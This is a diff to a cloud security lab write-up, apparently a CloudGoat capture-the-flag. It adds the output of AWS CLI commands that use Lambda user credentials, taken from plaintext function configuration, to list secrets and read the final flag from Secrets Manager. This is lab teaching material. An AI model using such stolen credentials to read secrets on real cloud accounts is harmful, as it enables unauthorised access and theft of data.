@@ -73,12 +73,25 @@ Discovery: Three functions are configured with plaintext AWS credentials in thei
 }
 ```
 [root] Objective_Secrets_Manager:~#
-I pivoted one last time using the Lambda user credentials. This user had the permissions required to access the final objective: AWS Secrets Manager.
+I pivoted one last time using the Lambda user credentials. This user had the permissions required to access the  AWS Secrets Manager.
 
 ```bash
 aws secretsmanager list-secrets --profile user --region us-east-1
 aws secretsmanager get-secret-value --secret-id cg-final-flag-cgid1cu9rl0f6y --profile user
+
+{
+Data Secrets 25
+ "ARN": "arn:aws:secretsmanager:us-east-1:703671921227:sec
+ret:cg-final-flag-cgid1cu9rl0f6y-Qe2Tlq",
+ "Name": "cg-final-flag-cgid1cu9rl0f6y",
+ "VersionId": "terraform-20260320184038801300000002",
+ "SecretString": "{\"flag\":\"d4t4_s3cr3ts_4r3_fun\"}",
+ "VersionStages": [
+ "AWSCURRENT"
+ ],
+ "CreatedDate": "2026-03-20T19:40:38.836000+01:00"
 ```
+
 Final_Flag: d4t4_s3cr3ts_4r3_fun
 
-Thanks you 
+Thank you 
